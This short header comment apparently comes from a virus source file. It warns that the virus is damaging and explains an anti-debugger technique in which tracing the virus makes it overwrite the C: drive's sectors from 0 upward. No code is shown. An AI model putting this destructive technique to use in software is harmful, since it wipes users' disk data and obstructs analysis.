=  CAUTION:   This virus contains damaging code.  Do NOT compile or 
=             execute the code until you understand the nature of the 
=             anti-debugger methods used in the virus.
=
=  NOTES:     This virus is actively debugger-resistant.  Use of a 
=             debugger will cause the virus to overwrite sectors 0 
=             upwards on the C: drive.  What makes this technique highly 
=             dangerous compared to other anti-debug techniques is that 
=             instead of simply sending the debugger tracing the wrong 
=             path, it forces the debugger to actually execute the disk-
=             writing routine. 
=
=             As of the time of this writing, no other virus uses this
=             technique.
